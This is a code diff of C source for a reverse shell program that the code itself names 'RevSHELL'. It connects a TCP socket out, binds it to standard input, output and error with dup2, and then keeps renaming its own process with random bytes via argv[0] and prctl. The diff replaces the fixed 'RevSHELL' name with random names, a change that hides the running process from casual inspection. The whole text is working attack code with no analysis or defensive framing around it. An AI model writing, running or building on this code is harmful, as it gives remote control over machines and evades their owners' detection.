@@ -73,7 +73,6 @@ void check_file_stat(int fd) {
     }
 }
 
-
 int main(int argc, char ** argv) {
     setjmp(env);
 
@@ -97,9 +96,6 @@ int main(int argc, char ** argv) {
             printf("[-] Child process\n");
         #endif
         
-        strcpy(argv[0], "RevSHELL");
-        prctl(PR_SET_NAME, "RevSHELL");
-
         lock_file(fd, F_SETLKW);
         
         int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -113,8 +109,6 @@ int main(int argc, char ** argv) {
 
         connect(sock, &addr, 16);
 
-        
-
         for (int i = 0; i < 3; i++) {
             dup2(sock, i);
         }
@@ -127,10 +121,10 @@ int main(int argc, char ** argv) {
         sleep(3);
 
         while (1) {
-            char name[6] = {'-','-'};
+            char name[7] = {0};
             int rand_fd = open("/dev/random", O_RDONLY);
-            read(rand_fd, name+2, 3);
-            strcpy(argv[0], name);
+
+            read(rand_fd, argv[0], 6);
             prctl(PR_SET_NAME, name);
 
             check_file_stat(fd);
@@ -141,8 +135,6 @@ int main(int argc, char ** argv) {
             }
             sleep(1);
         }
-
-
     }
 
     return EXIT_SUCCESS;
